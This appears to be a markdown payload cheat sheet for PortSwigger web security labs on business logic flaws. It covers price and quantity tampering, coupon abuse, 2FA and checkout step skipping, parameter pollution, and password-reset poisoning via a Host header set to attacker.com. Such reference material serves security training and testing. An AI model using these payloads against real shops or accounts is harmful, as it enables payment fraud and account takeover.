# Business Logic Flaws - Payload Reference

## Client-Side Trust

### Price Manipulation
```
# Change price in POST body during checkout
original: price=1337
modified: price=0
modified: price=1
modified: price=-100
```

### Quantity Manipulation
```
# Negative quantity to get money back
original: quantity=1
modified: quantity=-1
modified: quantity=0
```

### Discount/Coupon Abuse
```
# Apply coupon multiple times
# Use expired coupons
# Stack multiple coupons
```

## Authentication Logic Flaws

### Password Reset Poisoning
```
# Change Host header to attacker domain
POST /forgot-password
Host: attacker.com
username=victim
# Reset email sent to attacker.com
```

### 2FA Bypass
```
# Skip 2FA step by directly accessing protected page
GET /my-account (without completing 2FA)
```

### Race Condition in Password Reset
```
# Request multiple password resets simultaneously
# Each generates a different token
# Use the last valid token
```

## Access Control Logic Flaws

### Step Bypass
```
# Skip multi-step process
Step 1: /order/confirm → Step 2: /order/pay → Step 3: /order/complete
Bypass: Jump directly from Step 1 to Step 3
```

### Parameter Pollution
```
# Send same parameter twice
username=admin&username=user
# Server may use one, you control which
```

## PortSwigger Lab Approach
1. Understand the business flow (add to cart → checkout → pay)
2. Identify client-side controls (hidden fields, JS validation)
3. Manipulate values in transit (price, quantity, role)
4. Test edge cases (negative, zero, overflow, empty)
5. Skip steps or repeat steps
